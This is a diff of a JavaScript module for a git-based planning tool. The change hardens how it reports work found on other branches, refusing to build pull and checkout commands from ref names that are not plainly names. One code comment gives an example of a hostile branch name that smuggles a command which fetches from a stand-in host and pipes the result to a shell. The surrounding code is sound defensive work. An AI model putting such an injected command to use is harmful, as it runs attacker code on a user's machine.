@@ -39,7 +39,11 @@
 import { execFileSync } from 'node:child_process';
 import { basename } from 'node:path';
 
-import { parseFrontmatter, partitionCompletedPhases } from './state.js';
+import { gitEnv, gitUnusableReason } from './git-env.js';
+import { isPlainRefName, oddRefNameShown, printable, shownEpicName, shownRef } from './printable-text.js';
+import { parseFrontmatter, partitionCompletedPhases, PHASES } from './state.js';
+import { isSafeUnitName } from './unit-name.js';
+import { unitClosure, unitRecordsOn } from './unit-records.js';
 
 const GIT_TIMEOUT_MS = 5000;
 const FIELD_MAX = 160;
@@ -67,6 +71,8 @@ function defaultGit(baseDir, args, input) {
     stdio: ['pipe', 'pipe', 'pipe'],
     maxBuffer: 64 * 1024 * 1024,
     ...(input !== undefined ? { input } : {}),
+    // Last, so nothing spread above can stand in for it.
+    env: gitEnv(baseDir),
   });
 }
 
@@ -128,7 +134,7 @@ function soft(git, baseDir, args) {
  * @param {{localEpic?: string|null, git?: Function}} [opts]
  *   `git(baseDir, args, input?)` returns stdout; injectable for tests.
  * @returns {Promise<{open: Array<{epic: string, phase: string|null, branches: string[], checkout: string,
- *   sameBranch: boolean, pull: string|null, worktree: string|null}>, unclassified: string[], unreadable: string[],
+ *   sameBranch: boolean, pull: string|null|false, worktree: string|null}>, unclassified: string[], unreadable: string[],
  *   failed: boolean, cannotCheck: Array<{source: string, reason: string}>}>}
  */
 export async function findWorkOnOtherBranches(baseDir, { localEpic = null, git = defaultGit } = {}) {
@@ -143,6 +149,9 @@ export async function findWorkOnOtherBranches(baseDir, { localEpic = null, git =
     return done(true);
   };
 
+  // With a git Signal runs no check on (older than 2.38) the branches were not
+  // read: a cannot-check, with the reason — not the empty answer below.
+  if (git === defaultGit && gitUnusableReason() !== null) return fail(gitUnusableReason());
   // Not a repository, or a repository with no commits yet: there are no other
   // branches to be blind to, so this is a complete (empty) answer, not a cannot-check.
   try {
@@ -177,6 +186,40 @@ export async function findWorkOnOtherBranches(baseDir, { localEpic = null, git =
   } catch (err) {
     return fail(`could not list .planning/ on HEAD — ${gitWhy(err)}`);
   }
+
+  // Is this Epic already finished on the checked-out branch? With unit records
+  // (M6.E16 t6.4) its record here says so, when it has one: closed (held or
+  // not) is finished; open or *closing* is not. The record is read from the
+  // working tree by the unit library — the name came from another branch's
+  // STATE.md and never reaches a git argument. No record: rule 3's files on
+  // HEAD, as before. A record that does not read hides nothing: the Epic is
+  // still offered, and the problem is reported once.
+  // A `units/` folder that cannot be trusted is the same case for every Epic:
+  // none is called finished here, each is still offered, and the fault is
+  // reported once — rule 3's files are not read in its place.
+  const recordProblems = [];
+  let unitsOn;
+  let unitsFault = false;
+  try {
+    unitsOn = unitRecordsOn(baseDir);
+  } catch (err) {
+    unitsOn = false;
+    unitsFault = true;
+    recordProblems.push(err.message);
+  }
+  const isFinishedHere = (epic) => {
+    if (unitsFault) return false;
+    if (unitsOn) {
+      try {
+        const closure = unitClosure(baseDir, epic);
+        if (closure !== 'no-record') return closure !== 'open';
+      } catch (err) {
+        recordProblems.push(err.message);
+        return false;
+      }
+    }
+    return finishedHere.has(`${epic}-RETROSPECTIVE.md`) || finishedHere.has(`${epic}-SHIP.md`);
+  };
 
   let blobs;
   try {
@@ -251,7 +294,7 @@ export async function findWorkOnOtherBranches(baseDir, { localEpic = null, git =
     }
     const { valid } = partitionCompletedPhases(Array.isArray(data.completed_phases) ? data.completed_phases : []);
     if (valid.some((e) => e.startsWith('SHIP '))) return;
-    if (finishedHere.has(`${epic}-RETROSPECTIVE.md`) || finishedHere.has(`${epic}-SHIP.md`)) return;
+    if (isFinishedHere(epic)) return;
     if (localEpic && epic === localEpic) return;
     const entry = byEpic.get(epic) ?? { epic, phase: null, refs: [] };
     entry.refs.push(d);
@@ -272,13 +315,22 @@ export async function findWorkOnOtherBranches(baseDir, { localEpic = null, git =
       const viaUpstream = found.find((r) => r.display === upstream);
       if (viaUpstream) pull = 'git pull';
       else {
+        // A command only from names that are plainly names (r6.3): a remote or
+        // a branch can be called `x;curl${IFS}evil|sh` by whoever pushed it.
         const r = found[0];
-        pull = `git pull ${r.display.slice(0, r.display.length - r.branch.length - 1)} ${r.branch}`;
+        const remoteName = r.display.slice(0, r.display.length - r.branch.length - 1);
+        pull = isPlainRefName(remoteName) && isPlainRefName(r.branch) ? `git pull ${remoteName} ${r.branch}` : UNNAMEABLE;
       }
     }
     open.push({
-      epic,
-      phase,
+      // Another branch's STATE.md is written by whoever pushed it, and these
+      // two values go into messages, the advisory and a digest a model reads.
+      // An Epic is named as it is only when it is a name a unit may have (the
+      // store's rule, `isSafeUnitName`) — else as `shownEpicName` shows an odd
+      // one — and a phase only when it is one of Signal's.
+      // They were compared, above, as written.
+      epic: shownEpicName(epic, isSafeUnitName),
+      phase: phase === null || PHASES.includes(phase) ? phase : '(a phase that is not one of Signal\'s)',
       branches: found.map((r) => r.display),
       checkout,
       sameBranch,
@@ -290,19 +342,55 @@ export async function findWorkOnOtherBranches(baseDir, { localEpic = null, git =
   if (unreadable.length > 0) {
     cannotCheck.push({
       source,
-      reason: `STATE.md on ${unreadable.length} branch(es) could not be parsed: ${unreadable.join(', ')}`,
+      reason: `STATE.md on ${unreadable.length} branch(es) could not be parsed: ${shownBranches(unreadable, { noCommandHere: true })}`,
     });
   }
+  for (const reason of new Set(recordProblems)) cannotCheck.push({ source: 'unit records', reason });
   return done();
+}
+
+// `pull` for a remote copy whose remote or branch cannot be written into a command.
+const UNNAMEABLE = false;
+
+/**
+ * Branch names as a line lists them: each through `shownRef`
+ * (`printable-text.js`), so one that is not plainly a name shows as a
+ * placeholder.
+ *
+ * @param {string[]} branches
+ * @returns {string}
+ */
+export const shownBranches = (branches, { noCommandHere = false } = {}) => branches.map((b) => shownRef(b, 'branch', { noCommandHere })).join(', ');
+
+/**
+ * The step that switches to `branch`, as a sentence: the command when the
+ * name is plainly a name; otherwise NO command — a remote branch is named by
+ * whoever pushed it, and a command a person is told to run is not built from
+ * such a name (r6.3).
+ *
+ * @param {string} branch
+ * @returns {string}
+ */
+export function checkoutStep(branch) {
+  if (isPlainRefName(branch)) return `run \`git checkout ${branch}\` to continue it`;
+  const shown = oddRefNameShown(branch);
+  return `its branch${shown === null ? '' : `, \`${shown}\`,`} has a name that cannot be written safely in a command`
+    + `${shown === null ? ` (${String(branch).length} characters)` : ''}, so none is given — `
+    + 'find it with `git branch -a` and check it out yourself to continue it';
 }
 
 /** What a person does to continue an Epic found elsewhere — one sentence, shared by every caller. */
 export function nextStepFor(o) {
   if (o.sameBranch) {
-    return `it is on ${o.branches.join(', ')}, a remote copy of the branch you are on — run \`${o.pull ?? 'git pull'}\` to continue it`;
+    const where = `it is on ${shownBranches(o.branches)}, a remote copy of the branch you are on`;
+    return o.pull === UNNAMEABLE
+      ? `${where} — its remote or branch has a name that cannot be written safely in a command, so none is given; pull it yourself to continue it`
+      : `${where} — run \`${o.pull ?? 'git pull'}\` to continue it`;
   }
-  if (o.worktree) return `${o.checkout} is checked out in another worktree (${o.worktree}) — continue it there`;
-  return `run \`git checkout ${o.checkout}\` to continue it`;
+  // The path is this machine's own (`git worktree list`): shown as it is
+  // written, less what a terminal acts on — `/Users/josé/…` stays readable.
+  if (o.worktree) return `${shownRef(o.checkout, 'branch', { noCommandHere: true })} is checked out in another worktree (${printable(o.worktree)}) — continue it there`;
+  return checkoutStep(o.checkout);
 }
 
 /**
@@ -313,9 +401,9 @@ export function nextStepFor(o) {
 export function formatOtherBranchWork({ open = [], unclassified = [], unreadable = [] } = {}) {
   const lines = [];
   for (const o of open) {
-    lines.push(`⚠ ${o.epic} is open at ${o.phase ?? 'an unrecorded phase'} on ${o.branches.join(', ')} — ${nextStepFor(o)}.`);
+    lines.push(`⚠ ${o.epic} is open at ${o.phase ?? 'an unrecorded phase'} on ${shownBranches(o.branches)} — ${nextStepFor(o)}.`);
   }
-  const list = (xs) => `${xs.slice(0, 5).join(', ')}${xs.length > 5 ? ', …' : ''}`;
+  const list = (xs) => `${shownBranches(xs.slice(0, 5), { noCommandHere: true })}${xs.length > 5 ? ', …' : ''}`;
   if (unclassified.length > 0) {
     lines.push(
       `ℹ ${unclassified.length} unmerged branch(es) carry a STATE.md with no Epic id, so they could not be compared: ${list(unclassified)}`
